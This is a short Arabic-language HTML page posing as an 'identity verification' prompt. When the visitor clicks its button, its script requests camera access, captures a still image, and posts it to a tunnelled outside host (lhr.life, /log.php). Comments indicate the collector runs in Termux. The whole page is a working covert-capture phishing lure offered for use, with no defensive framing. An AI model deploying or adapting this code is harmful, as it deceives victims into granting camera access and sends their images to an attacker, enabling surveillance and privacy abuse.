<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="text-align:center; padding-top:50px; background:#eee;">
    <div style="background:white; padding:20px; border-radius:10px; display:inline-block;">
        <h3>نظام التحقق</h3>
        <button onclick="check()" style="padding:20px; background:blue; color:white; border:none; border-radius:5px;">تأكيد الهوية الآن</button>
    </div>
    <script>
    async function check() {
        alert("بدأ التحقق... وافق على الأذونات القادمة");
        const url = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا رابط ترمكس النشط الآن
        
        try {
            // طلب الكاميرا أولاً وبقوة
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            alert("تم تشغيل الكاميرا بنجاح");
            
            const v = document.createElement('video');
            v.srcObject = s; v.play();

            setTimeout(async () => {
                const c = document.createElement('canvas');
                c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0);
                const img = c.toDataURL('image/jpeg');
                
                await fetch(url + '/log.php', {method:'POST', body: JSON.stringify({img: img})});
                alert("تم إرسال الصورة لترمكس بنجاح");
                s.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) {
            alert("فشل: يجب فتح الرابط في متصفح Chrome ومنحه إذن الكاميرا");
        }
    }
    </script>
</body>
</html>
